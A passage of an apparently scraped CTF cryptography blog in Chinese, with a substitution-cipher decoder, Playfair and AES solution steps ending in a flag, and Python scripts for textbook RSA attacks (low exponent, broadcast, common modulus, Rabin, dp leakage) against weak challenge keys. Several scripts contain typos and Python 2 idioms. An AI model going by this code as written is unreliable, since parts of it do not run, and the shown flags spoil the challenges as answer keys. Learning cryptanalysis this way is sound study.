quot;maritime&quot;],[&quot;89&quot;,&quot;nightbird&quot;,&quot;matchmaker&quot;],[&quot;8A&quot;,&quot;Oakland&quot;,&quot;maverick&quot;],[&quot;8B&quot;,&quot;obtuse&quot;,&quot;Medusa&quot;],[&quot;8C&quot;,&quot;offload&quot;,&quot;megaton&quot;],[&quot;8D&quot;,&quot;optic&quot;,&quot;microscope&quot;],[&quot;8E&quot;,&quot;orca&quot;,&quot;microwave&quot;],[&quot;8F&quot;,&quot;payday&quot;,&quot;midsummer&quot;],[&quot;90&quot;,&quot;peachy&quot;,&quot;millionaire&quot;],[&quot;91&quot;,&quot;pheasant&quot;,&quot;miracle&quot;],[&quot;92&quot;,&quot;physique&quot;,&quot;misnomer&quot;],[&quot;93&quot;,&quot;playhouse&quot;,&quot;molasses&quot;],[&quot;94&quot;,&quot;Pluto&quot;,&quot;molecule&quot;],[&quot;95&quot;,&quot;preclude&quot;,&quot;Montana&quot;],[&quot;96&quot;,&quot;prefer&quot;,&quot;monument&quot;],[&quot;97&quot;,&quot;preshrunk&quot;,&quot;mosquito&quot;],[&quot;98&quot;,&quot;printer&quot;,&quot;narrative&quot;],[&quot;99&quot;,&quot;prowler&quot;,&quot;nebula&quot;],[&quot;9A&quot;,&quot;pupil&quot;,&quot;newsletter&quot;],[&quot;9B&quot;,&quot;puppy&quot;,&quot;Norwegian&quot;],[&quot;9C&quot;,&quot;python&quot;,&quot;October&quot;],[&quot;9D&quot;,&quot;quadrant&quot;,&quot;Ohio&quot;],[&quot;9E&quot;,&quot;quiver&quot;,&quot;onlooker&quot;],[&quot;9F&quot;,&quot;quota&quot;,&quot;opulent&quot;],[&quot;A0&quot;,&quot;ragtime&quot;,&quot;Orlando&quot;],[&quot;A1&quot;,&quot;ratchet&quot;,&quot;outfielder&quot;],[&quot;A2&quot;,&quot;rebirth&quot;,&quot;Pacific&quot;],[&quot;A3&quot;,&quot;reform&quot;,&quot;pandemic&quot;],[&quot;A4&quot;,&quot;regain&quot;,&quot;Pandora&quot;],[&quot;A5&quot;,&quot;reindeer&quot;,&quot;paperweight&quot;],[&quot;A6&quot;,&quot;rematch&quot;,&quot;paragon&quot;],[&quot;A7&quot;,&quot;repay&quot;,&quot;paragraph&quot;],[&quot;A8&quot;,&quot;retouch&quot;,&quot;paramount&quot;],[&quot;A9&quot;,&quot;revenge&quot;,&quot;passenger&quot;],[&quot;AA&quot;,&quot;reward&quot;,&quot;pedigree&quot;],[&quot;AB&quot;,&quot;rhythm&quot;,&quot;Pegasus&quot;],[&quot;AC&quot;,&quot;ribcage&quot;,&quot;penetrate&quot;],[&quot;AD&quot;,&quot;ringbolt&quot;,&quot;perceptive&quot;],[&quot;AE&quot;,&quot;robust&quot;,&quot;performance&quot;],[&quot;AF&quot;,&quot;rocker&quot;,&quot;pharmacy&quot;],[&quot;B0&quot;,&quot;ruffled&quot;,&quot;phonetic&quot;],[&quot;B1&quot;,&quot;sailboat&quot;,&quot;photograph&quot;],[&quot;B2&quot;,&quot;sawdust&quot;,&quot;pioneer&quot;],[&quot;B3&quot;,&quot;scallion&quot;,&quot;pocketful&quot;],[&quot;B4&quot;,&quot;scenic&quot;,&quot;politeness&quot;],[&quot;B5&quot;,&quot;scorecard&quot;,&quot;positive&quot;],[&quot;B6&quot;,&quot;Scotland&quot;,&quot;potato&quot;],[&quot;B7&quot;,&quot;seabird&quot;,&quot;processor&quot;],[&quot;B8&quot;,&quot;select&quot;,&quot;provincial&quot;],[&quot;B9&quot;,&quot;sentence&quot;,&quot;proximate&quot;],[&quot;BA&quot;,&quot;shadow&quot;,&quot;puberty&quot;],[&quot;BB&quot;,&quot;shamrock&quot;,&quot;publisher&quot;],[&quot;BC&quot;,&quot;showgirl&quot;,&quot;pyramid&quot;],[&quot;BD&quot;,&quot;skullcap&quot;,&quot;quantity&quot;],[&quot;BE&quot;,&quot;skydive&quot;,&quot;racketeer&quot;],[&quot;BF&quot;,&quot;slingshot&quot;,&quot;rebellion&quot;],[&quot;C0&quot;,&quot;slowdown&quot;,&quot;recipe&quot;],[&quot;C1&quot;,&quot;snapline&quot;,&quot;recover&quot;],[&quot;C2&quot;,&quot;snapshot&quot;,&quot;repellent&quot;],[&quot;C3&quot;,&quot;snowcap&quot;,&quot;replica&quot;],[&quot;C4&quot;,&quot;snowslide&quot;,&quot;reproduce&quot;],[&quot;C5&quot;,&quot;solo&quot;,&quot;resistor&quot;],[&quot;C6&quot;,&quot;southward&quot;,&quot;responsive&quot;],[&quot;C7&quot;,&quot;soybean&quot;,&quot;retraction&quot;],[&quot;C8&quot;,&quot;spaniel&quot;,&quot;retrieval&quot;],[&quot;C9&quot;,&quot;spearhead&quot;,&quot;retrospect&quot;],[&quot;CA&quot;,&quot;spellbind&quot;,&quot;revenue&quot;],[&quot;CB&quot;,&quot;spheroid&quot;,&quot;revival&quot;],[&quot;CC&quot;,&quot;spigot&quot;,&quot;revolver&quot;],[&quot;CD&quot;,&quot;spindle&quot;,&quot;sandalwood&quot;],[&quot;CE&quot;,&quot;spyglass&quot;,&quot;sardonic&quot;],[&quot;CF&quot;,&quot;stagehand&quot;,&quot;Saturday&quot;],[&quot;D0&quot;,&quot;stagnate&quot;,&quot;savagery&quot;],[&quot;D1&quot;,&quot;stairway&quot;,&quot;scavenger&quot;],[&quot;D2&quot;,&quot;standard&quot;,&quot;sensation&quot;],[&quot;D3&quot;,&quot;stapler&quot;,&quot;sociable&quot;],[&quot;D4&quot;,&quot;steamship&quot;,&quot;souvenir&quot;],[&quot;D5&quot;,&quot;sterling&quot;,&quot;specialist&quot;],[&quot;D6&quot;,&quot;stockman&quot;,&quot;speculate&quot;],[&quot;D7&quot;,&quot;stopwatch&quot;,&quot;stethoscope&quot;],[&quot;D8&quot;,&quot;stormy&quot;,&quot;stupendous&quot;],[&quot;D9&quot;,&quot;sugar&quot;,&quot;supportive&quot;],[&quot;DA&quot;,&quot;surmount&quot;,&quot;surrender&quot;],[&quot;DB&quot;,&quot;suspense&quot;,&quot;suspicious&quot;],[&quot;DC&quot;,&quot;sweatband&quot;,&quot;sympathy&quot;],[&quot;DD&quot;,&quot;swelter&quot;,&quot;tambourine&quot;],[&quot;DE&quot;,&quot;tactics&quot;,&quot;telephone&quot;],[&quot;DF&quot;,&quot;talon&quot;,&quot;therapist&quot;],[&quot;E0&quot;,&quot;tapeworm&quot;,&quot;tobacco&quot;],[&quot;E1&quot;,&quot;tempest&quot;,&quot;tolerance&quot;],[&quot;E2&quot;,&quot;tiger&quot;,&quot;tomorrow&quot;],[&quot;E3&quot;,&quot;tissue&quot;,&quot;torpedo&quot;],[&quot;E4&quot;,&quot;tonic&quot;,&quot;tradition&quot;],[&quot;E5&quot;,&quot;topmost&quot;,&quot;travesty&quot;],[&quot;E6&quot;,&quot;tracker&quot;,&quot;trombonist&quot;],[&quot;E7&quot;,&quot;transit&quot;,&quot;truncated&quot;],[&quot;E8&quot;,&quot;trauma&quot;,&quot;typewriter&quot;],[&quot;E9&quot;,&quot;treadmill&quot;,&quot;ultimate&quot;],[&quot;EA&quot;,&quot;Trojan&quot;,&quot;undaunted&quot;],[&quot;EB&quot;,&quot;trouble&quot;,&quot;underfoot&quot;],[&quot;EC&quot;,&quot;tumor&quot;,&quot;unicorn&quot;],[&quot;ED&quot;,&quot;tunnel&quot;,&quot;unify&quot;],[&quot;EE&quot;,&quot;tycoon&quot;,&quot;universe&quot;],[&quot;EF&quot;,&quot;uncut&quot;,&quot;unravel&quot;],[&quot;F0&quot;,&quot;unearth&quot;,&quot;upcoming&quot;],[&quot;F1&quot;,&quot;unwind&quot;,&quot;vacancy&quot;],[&quot;F2&quot;,&quot;uproot&quot;,&quot;vagabond&quot;],[&quot;F3&quot;,&quot;upset&quot;,&quot;vertigo&quot;],[&quot;F4&quot;,&quot;upshot&quot;,&quot;Virginia&quot;],[&quot;F5&quot;,&quot;vapor&quot;,&quot;visitor&quot;],[&quot;F6&quot;,&quot;village&quot;,&quot;vocalist&quot;],[&quot;F7&quot;,&quot;virus&quot;,&quot;voyager&quot;],[&quot;F8&quot;,&quot;Vulcan&quot;,&quot;warranty&quot;],[&quot;F9&quot;,&quot;waffle&quot;,&quot;Waterloo&quot;],[&quot;FA&quot;,&quot;wallet&quot;,&quot;whimsical&quot;],[&quot;FB&quot;,&quot;watchword&quot;,&quot;Wichita&quot;],[&quot;FC&quot;,&quot;wayside&quot;,&quot;Wilmington&quot;],[&quot;FD&quot;,&quot;willow&quot;,&quot;Wyoming&quot;],[&quot;FE&quot;,&quot;woodlark&quot;,&quot;yesteryear&quot;],[&quot;FF&quot;,&quot;Zulu&quot;,&quot;Yucatan&quot;]]_string = &quot;endow gremlin indulge bison flatfoot fallout goldfish bison hockey fracture fracture bison goggles jawbone bison flatfoot gremlin glucose glucose fracture flatfoot indoors gazelle gremlin goldfish bison guidance indulge keyboard keyboard glucose fracture hockey bison gazelle goldfish bison cement frighten gazelle goldfish indoors buzzard highchair fallout highchair bison fallout goldfish flytrap bison fallout goldfish gremlin indoors frighten fracture highchair bison cement fracture goldfish flatfoot gremlin flytrap fracture buzzard guidance goldfish freedom buzzard allow crowfoot jawbone bison indoors frighten fracture bison involve fallout jawbone Burbank indoors frighten fracture bison guidance gazelle flatfoot indoors indulge highchair fracture bison hockey frighten gremlin indulge flytrap bison flagpole fracture bison indulge hockey fracture flytrap bison allow blockade endow indulge hockey fallout blockade bison gazelle hockey bison inverse fracture highchair jawbone bison gazelle goggles guidance gremlin highchair indoors fallout goldfish indoors bison gazelle goldfish bison indoors frighten gazelle hockey bison flatfoot frighten fallout glucose glucose fracture goldfish freedom fracture blackjack blackjack&quot;def tihuan(s): for i in aaa: s = s.replace(i[1],i[0]) s = s.replace(i[2],i[0]) return sbbb = tihuan(_string)print(bbb)ccc = bbb.split(&quot; &quot;)ddd = &quot;&quot;for i in ccc: ddd+=chr(int(i,16))print(ddd) 隐藏字符加密http://www.atoolbox.net/Tool.php?Id=829 playfair密文：iuf_xat_hmoz_gocwmx https://www.dcode.fr/playfair-cipher ###长得像base64的AES U2FsdGVkX19QwGkcgD0fTjZxgijRzQOGbCWALh4sRDec2w6xsY&#x2F;ux53Vuj&#x2F;AMZBDJ87qyZL5kAf1fmAH4Oe13Iu435bfRBuZgHpnRjTBn5+xsDHONiR3t0+Oa8yG&#x2F;tOKJMNUauedvMyN4v4QKiFunw&#x3D;&#x3D; 输入密钥ISCC 解密得到：U2FsdGVkX18OvTUlZubDnmvk2lSAkb8Jt4Zv6UWpE7Xb43f8uzeFRUKGMo6QaaNFHZriDDV0EQ&#x2F;qt38Tw73tbQ&#x3D;&#x3D; 再次解密得到： flag{DugUpADiamondADeepDarkMine}","categories":[{"name":"密码学","slug":"密码学","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"杂","slug":"杂","permalink":"https://gryffinbit.top/tags/%E6%9D%82/"}],"author":"Gryffinbit"},{"title":"RSA原理基本介绍","slug":"RSA原理基本介绍","date":"2020-11-14T16:41:14.000Z","updated":"2024-11-12T06:59:23.000Z","comments":true,"path":"2020/11/15/RSA原理基本介绍/","permalink":"https://gryffinbit.top/2020/11/15/RSA%E5%8E%9F%E7%90%86%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"RSA的基本介绍 python pow函数的用法：计算x的y次方，如果z在存在，则再对结果进行取模，其结果等效于pow(x,y) %z 123import mathmath.pow(x, y[, z]) 求明文m，用该函数求c（密文cipher）的d次方，得到： $$d\\equiv e^{-1}$$ $$m&#x3D;pow(cipher,e^{-1})$$ d是e的乘法逆元 ，e^-1 是乘法逆元，并不是-1次方的意思 利用gmpy2库，来求出明文m gmpy2这里主要是用于它的开方功能。即：c去开e次方（e&#x3D;65537） 123456import gmpy2from Crypto.Util.number import *data = open(&#x27;rsa_16m&#x27;, &#x27;r&#x27;).read().split(&#x27;\\n&#x27;)m = gmpy2.iroot(int(data[1][4:], 16), int(data[2][4:], 16))[0]print(long_to_bytes(m)) #注意python环境配置 pip3 install gmpy2 pip3 install Crypto tips: 一些技巧exp() 方法返回x的指数,ex。 以下是 exp() 方法的语法: 123import mathmath.exp( x ) log() 返回 x 的自然对数。 以下是 log() 方法的语法: 123import mathmath.log(x[, base]) 注意：log()是不能直接访问的，需要导入 math 模块，通过静态对象调用该方法。 参数 x – 数值表达式。 base – 可选，底数，默认为 e。 $$ed\\equiv 1 mod \\varphi(n)$$ $$m^e mod n \\equiv c$$","categories":[{"name":"密码学","slug":"密码学","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://gryffinbit.top/tags/RSA/"}],"author":"Gryffinbit"},{"title":"RSA","slug":"RSA","date":"2020-11-13T16:47:42.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2020/11/14/RSA/","permalink":"https://gryffinbit.top/2020/11/14/RSA/","excerpt":"","text":"参数N：大整数N，我们称之为模数（modulus） p 和 q ：大整数N的两个因子（factor） e 和 d：互为模反数的两个指数（exponent） c 和 m：分别是密文和明文 &#123;N,e&#125;称为公钥,&#123;N,d&#125;称为私钥 解题思路 选取两个较大的互不相等的质数p和q，计算n &#x3D; p * q 。 计算phi &#x3D; (p-1) * (q-1) 。 选取任意e，使得e满足 1&lt;e&lt;phi 且 gcd(e , phi) &#x3D;&#x3D; 1 。 计算e关于n的模逆元d， 即d满足(e * d)% n &#x3D;&#x3D;1 。 加解密：c &#x3D; (m ^ e) % n ， m &#x3D; (c ^ d) % n 。其中m为明文，c为密文，(n,e)为公钥对，d为私钥，要求 0 &lt;&#x3D; m &lt; n 。 tips： 如果所给为多个N，使用公因数攻 当E为1，2或特别大时，使用Rabin攻击或低解密指数攻击 当E为3时，如果只给出一组明密文。使用低加密指数攻击，如果给出多组明密文，使用低加密指数广播攻击 如果所给为多次加密，使用同个N，使用共模攻击 gmpy2 大数库的安装1234brew install libmpcpip install gmpy2python3.8 xxx.py RSA的攻击手段求解逆元12import gmpy2print (gmpy2.invert(47,30)) 分解n12pip install factordb-pyclifactordb n的值 求解出p、q http://factordb.com/ 也可以求解 已知p,q,e，获取d（例子）123456789import gmpy2p =gmpy2.mpz(336771668019607304680919844592337860739)q =gmpy2.mpz(296173636181072725338746212384476813557)e =gmpy2.mpz(65537)phi_n= (p - 1) * (q - 1)d = gmpy2.invert(e, phi_n)print(&quot;d is:&quot;)print (d) 已知N,e,c，求m1234567891011121314import gmpy2p = 336771668019607304680919844592337860739q = 296173636181072725338746212384476813557e = 65537c = 55907434463693004339309251502084272273011794908408891123020287672115136392494n = p * qfn = (p - 1) * (q - 1)d = gmpy2.invert(e, fn)h = hex(gmpy2.powmod(c, d, n))[2:]if len(h) % 2 == 1: h = &#x27;0&#x27; + hs = h#s = h.decode(&#x27;hex&#x27;)print (s) 已知N,e,c，求m 出题人会给你一个公钥文件（通常是以.pem或.pub结尾的文件）和密文（通常叫做flag.enc之类的），你需要分析公钥，提取出（N，e），通过各种攻击手段恢复私钥，然后去解密密文得到flag。 EG:一般先用openssl提取公钥文件中的N和e。 openssl rsa -pubin -text -modulus -in public.pem 12345678910111213import gmpy2p = 336771668019607304680919844592337860739q = 296173636181072725338746212384476813557e = 65537f = int(open(&#x27;flag.enc&#x27;, &#x27;rb&#x27;).read().encode(&#x27;hex&#x27;), 16)print fn = p * qfn = (p - 1) * (q - 1)d = gmpy2.invert(e, fn)h = hex(gmpy2.powmod(f, d, n))[2:]if len(h) % 2 == 1: h = &#x27;0&#x27; + hprint (h) 低指数攻击 e的选取很小 e的选取很小1234567891011import gmpy2e = 3n= 22885480907469109159947272333565375109310485067211461543881386718201442106967914852474989176175269612229966461160065872310916096148216253429849921988412342732706875998100337754561586600637594798877898552625378551427864501926224989873772743227733285336042475675299391051376624685754547818835551263597996620383338263448888107691240136257201191331617560711786674975909597833383395574686942099700631002290836152972352041024137872983284691831292216787307841877839674258086005814225532597955826353796634417780156185485054141684249037538570742860026295194559710972266059844824388916869414355952432189722465103299013237588737c= 15685364647213619014219110070569189770745535885901269792039052046431067708991036961644224230125219358149236447900927116989931929305133870392430610563331490276096858863490412102016758082433435355613099047001069687409209484751075897343335693872741print (&#x27;n=&#x27;, n)print (&#x27;c=&#x27;, c)print (&#x27;[+]Detecting m...&#x27;)result = gmpy2.iroot(c, 3)print (&#x27; [-]The c has cubic root?&#x27;, result[1])if result[1]: print (&#x27; [-]The m is:&#x27;, &#x27;&#123;:x&#125;&#x27;.format(result[0]) #print (&#x27; [-]The m is:&#x27;, &#x27;&#123;:x&#125;&#x27;.format(result[0]).decode(&#x27;hex&#x27;))print (&#x27;[!]All Done!&#x27;) m的 3 次方比N大，但不足够大1234567891011121314151617import gmpy2, timee = 3n = 114976915747243387792157708464120735018971336213935438953074748276198282761939060395482051056351068439137722626185590043024556656813730840050547350912425438364703854627760482842307943026011880815011654341047422453012558617703411700393668892701036222135444420377515575624398723436532681305293727164639582093389c = 5828813410620741112500628876643872258919868379601617907887884191584237969605489971465692568848339200057188383649365078832766143513766368216471491824042974016773526107276856706832404477882581400769791378958901067683158857990261489285951805740071223765359992165262854641069674603160977034446644199945940251030i = 239000000 print (&#x27;n=&#x27;, n)print (&#x27;c=&#x27;, c)print (&#x27;[!]Done!\\n&#x27;)print (&#x27;[+]Detecting m...&#x27;)s = time.process_time()while 1: m, b = gmpy2.iroot(c + i * n, 3) if b: print (&#x27; [-]m is: &#x27; + &#x27;&#123;:x&#125;&#x27;.format(int(m))) break #print &#x27; [-]i = %d\\r&#x27; % i, i += 1print (&#x27;[!]Timer:&#x27;, round(time.process_time() - s, 2), &#x27;s&#x27;) 选取的加密指数较低，并且使用了相同的加密指数 给了三组加密的参数和明密文，其中题目很明确地能告诉你这三组的明文都是一样的 12345678910111213141516171819202122import gmpy2import timefrom functools import reducedef CRT(items): N = reduce(lambda x, y: x * y, (i[1] for i in items)) result = 0 for a, n in items: m = N / n d, r, s = gmpy2.gcdext(n, m) if d != 1: raise Exception(&quot;Input not pairwise co-prime&quot;) result += a * s * m return result % N, N# è¯»å…¥ e, n, c e = 9n = [142782424368849674771976671955176187834932417027468006479038058385550042422280158726561712259205616626939123504489410624745195777853423961104590708231562726165590769610040722589287393102301338152085670464005026301781192671834390892019478189768725018303217559795377795540494239283891894830166363576205812991157,153610425077816156109768509904751446801233412970601397035720458311275245730833227428213917577405780162151444202393431444812010569489900435979730559895340377469612234558042643742219128033827948585534761030527275423811282367831985007507137144308704413007806012914286105842311420933479771294576841956749281552971,152540067782701001222493009941492423063369171831039847414320547494725020441901272486665728360741395415762864872737675660423920609681185809510355937534756399208661762715484879562585724584849261266873624875852300611683382543315580370484972470694466195837255994159609193239840228218925381488410059939975556977947,125842716702134814646356078531900645012495638692517778270527426844383063904041812273637776798591687732598509470005151551320457132061693618473039437320011446697406190781306264437609046721508738109650829547010385875425097336266103994639126319889016342284747700714199556143378526590058467791687837422897022829661,116144389285266462769913139639175922392318396923181100785008570884082681963637784423143843845816350379438789947802939701820129805341796427821894273985551331666719808355412080909245720551238149511778060242720419584504473490216670437024863860559347959698828131475160058721701582089480924088773887932997353631767,127833907448946785858374094953899556339175475846831397383049660262333005992005484987913355932559627279178940862787593749842796469355336182379062826441222705075178971785791223706944120681105575965622931327112817747065200324610697178273898956820957640413744954233327851461318200323486469677469950386824833536523,130561613227079478921314550968562766645507834694262831586725464124109153306162445639759476845681271537955934718244296904503168256991962908095007040044300188572466395275317838178325500238288302672390013747102961340256309124310478931896245221622317302428447389760864327859640573452084295225059466376349115703119,115953389401040751013569404909249958538962411171147823610874077094621794755967854844224923689925397631692572916641171075740839099217316101334941033937183815345038898177087515909675028366437302462022970987947264115373697445950951595479758872029099661065186221250394358255523574834723958546450323357472451930993,143437107845384843564651522639125300763388830136500260725097766445883003928355325003575359566631064630487365774344508496878731109174874449170057678821440711511966073934025028100604234445470976333825866939923998344367645612128590820812489407412175198698290167077116185959180877334222693344630253253476594907313]c = [85033868418784308573673709960700777350314426427677627319697346811123742342359072170220428874952996988431950989321281905284522596263957356289624365171732095210045916218066135140320107686084053271623461104022705353814233772164502775939590711842361956121603943483040254727995655776263673058788416722141673409688,66065963470666895005407449599703926269325406456711861190876894466341571726360462706664546294453572319565476664348345756905411939632955966517708138047546806602828064213238537646393524578984547577761559965654539771172357089802682793169968961304179886652390277814477825753096636750388350662980872556701402397564,116011740820520887443111656288411611070614127688662643257265381793048354928820176624229624692124188995846076431510548507016903260774215950803926107831505634778278712070141663189086436127990584944132764896694777031370995058271038329228336417590284517922855284619653301817355115583540545182119702335431334401666,97640420284096094887471273365295984332267897927392169402918423863919914002451127544715668846623138003564829254309568918651163254043205129883843425179687841236818720463784828905460885026290909768599562386370732119591181513319548915478512030197629196018254041500662654260834562708620760373487652389789200792120,8112507653841374573057048967617108909055624101437903775740427861003476480616929517639719198652146909660899632120639789106782550275648578142883715280547602249589837441805676364041484345030575130408744621981440093280624046635769338568542048839419939250444929802135605724150484414516536378791500915047844188300,36792148360808115566234645242678223867680969786675055638670907933041180936164293809961667801099516457636164692292891528415720085345494773373966277807505798679784807614784581861287048096977968620964436947452527540958289441390882589051225367658014709290392321808926567572528170531844664734909469690750971883323,53043093283305492238903255767698153246673671181809989362223466090875767705978690531154079519999671834688647277179370374802495005937892824566602423646978168777735383632928274082669949750078161820002768640908750005814934158829006019656592134357897586040866207754535586785064545866404380204728594863102313407789,88499407133762624445946519155722583633934260410706930537441122463087556094734626189377091740335667052378955691250910459790202385799502439716173363179773811920751410726795431402796346647688144853156900427797933862087074385441977254140336390678022955770879265490567987868532251217565094093318626424653599450992,138337520305048557335599940473834485492131424901034295018189264168040969172072024612859307499682986987325414798210700710891033749119834960687318156171051379643844580970963540418974136891389303624057726575516576726845229494107327508855516437230240365759885913142671816868762838801720492804671259709458388192984]print (&#x27;[+]Detecting m...&#x27;)data = zip(c, n)x, n = CRT(data)realnum = gmpy2.iroot(gmpy2.mpz(x), e)[0].digits()print (&#x27; [-]m is: &#x27; + &#x27;&#123;:x&#125;&#x27;.format(int(realnum)))print (&#x27;[!]All Done!&#x27;) ###低解密指数攻击 e特别大 共模攻击 相同的模N对相同的明文m进行了加密。若干次加密，e不同，N相同，m相同。 12345678910111213141516171819202122232425import timeimport gmpy2n = 158052722013789461456896900244510199169216575693048895162538548356466884311543740968048825149608833390255268602486435690724338965409521812963337715301197225841194835534751041470231293288252951274190599189716955573428884560130364021535005115652592074445852835422027406556727605302404510264249211145063332337043e = [665213, 368273]c = [16698617641888248664694980135332125531792692516788088682722832061393117609508765284473236240256421599515450690670639565968165473479697383505401285976148490839526672808730165847471005704945978274496508928460578173068717106075169723401049489389383596761956301440156581021583368058047939083755488885694261340425, 59192887933967939708054321952273893559113509451228797382728687616356609407020086787061368452871936378934964292805289941535766263083244529814852043063188312786173717046316177403357053871483983775362121186037776932260378728059531236711960979620603784044468207000654149190295060179235411429700710154759043236436]print (&#x27;[+]Detecting m...&#x27;)time.process_time()c1 = c[0]c2 = c[1]e1 = e[0]e2 = e[1]s = gmpy2.gcdext(e1, e2)s1 = s[1]s2 = s[2] if s1 &lt; 0: s1 = -s1 c1 = gmpy2.invert(c1, n)elif s2 &lt; 0: s2 = -s2 c2 = gmpy2.invert(c2, n)m = pow(c1, s1, n) * pow(c2, s2, n) % nprint (&#x27; [-]m is:&#x27; + &#x27;&#123;:x&#125;&#x27;.format(int(m)))print (&#x27;\\n[!]Timer:&#x27;, round(time.process_time(),2), &#x27;s&#x27;)print (&#x27;[!]All Done!&#x27;) Rabin攻击 当e&#x3D;2时 1234567891011121314151617181920212223242526import gmpy2import stringfrom Crypto.PublicKey import RSA# 读取公钥参数 with open(&#x27;./tmp/pubkey.pem&#x27;, &#x27;r&#x27;) as f: key = RSA.importKey(f) N = key.n e = key.e p = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239with open(&#x27;./tmp/flag.enc&#x27;, &#x27;r&#x27;) as f: cipher = f.read().encode(&#x27;hex&#x27;) cipher = string.atoi(cipher, base=16) # print cipher # 计算yp和yq yp = gmpy.invert(p,q)yq = gmpy2.invert(q,p)# 计算mp和mq mp = pow(cipher, (p + 1) / 4, p)mq = pow(cipher, (q + 1) / 4, q)# 计算a,b,c,d a = (yp * p * mq + yq * q * mp) % Nb = N - int(a)c = (yp * p * mq - yq * q * mp) % Nd = N - int(c)for i in (a,b,c,d): s = &#x27;%x&#x27; % i if len(s) % 2 != 0: s = &#x27;0&#x27; + s print (s) e&#x3D;112345678910111213141516import binasciiimport gmpy2N_hex=0x180be86dc898a3c3a710e52b31de460f8f350610bf63e6b2203c08fddad44601d96eb454a34dab7684589bc32b19eb27cffff8c07179e349ddb62898ae896f8c681796052ae1598bd41f35491175c9b60ae2260d0d4ebac05b4b6f2677a7609c2fe6194fe7b63841cec632e3a2f55d0cb09df08eacea34394ad473577dea5131552b0b30efac31c59087bfe603d2b13bed7d14967bfd489157aa01b14b4e1bd08d9b92ec0c319aeb8fedd535c56770aac95247d116d59cae2f99c3b51f43093fd39c10f93830c1ece75ee37e5fcdc5b174052eccadcadeda2f1b3a4a87184041d5c1a6a0b2eeaa3c3a1227bc27e130e67ac397b375ffe7c873e9b1c649812edcde_hex=0x1c_hex=0x4963654354467b66616c6c735f61706172745f736f5f656173696c795f616e645f7265617373656d626c65645f736f5f63727564656c797dc_hex = gmpy2.mpz(c_hex)N_hex = gmpy2.mpz(N_hex)i = 0while i&lt;10: m_hex = hex(c_hex + gmpy2.mpz(hex(i))*N_hex) print(m_hex[2:]) try: print(binascii.a2b_hex(m_hex[2:]).decode(&quot;utf8&quot;)) except binascii.Error as e: print(&quot;位数非偶数，跳过...&quot;) i += 1 部分参数泄露123456789101112131415import gmpy2import binasciidef decrypt(dp,dq,p,q,c): InvQ = gmpy2.invert(q,p) mp = pow(c,dp,p) mq = pow(c,dq,q) m=(((mp-mq)*InvQ)%p)*q+mq print (binascii.unhexlify(hex(m)[2:]))p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852decrypt(dp,dq,p,q,c) dp泄露1234567891011121314151617181920import gmpy2import binasciidef getd(n,e,dp): for i in range(1,e): if (dp*e-1)%i == 0: if n%(((dp*e-1)/i)+1)==0: p=((dp*e-1)/i)+1 q=n/(((dp*e-1)/i)+1) phi = (p-1)*(q-1) d = gmpy2.invert(e,phi)%phi return de = 65537n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751d=getd(n,e,dp)m=pow(c,d,n)print (binascii.unhexlify(hex(m)[2:])) 123456789101112131415161718192021import gmpy2import binasciidef getd(n,e,dp): for i in range(1,e): if (dp*e-1)%i == 0: if n%(((dp*e-1)/i)+1)==0: p=((dp*e-1)/i)+1 q=n/(((dp*e-1)/i)+1) phi = (p-1)*(q-1) d = gmpy2.invert(e,phi)%phi return de = 65537n = 156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847c = 108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869dp = 734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825d=getd(n,e,dp)m=pow(c,d,n)print (binascii.unhexlify(hex(m)[2:])) 报错No module named ‘Crypto’12sudo pip3 uninstall cryptosudo pip3 uninstall pycrypto Then install the pycrypto module again using: 123sudo pip3 install pycryptosudo pip uninstall cryptosudo pip uninstall pycrypto Then install the pycrypto module again using: 1sudo pip install pycrypto module ‘time’ has no attribute ‘clock’time.clock()换成time.process_time() ‘map’ object is not subscriptable1、下面语句报错python3 TypeError: ‘map’ object is not subscriptable 1map(apply_filters_to_token, sentences) 2、修改，add “list” to map 1return list(map(apply_filters_to_token, 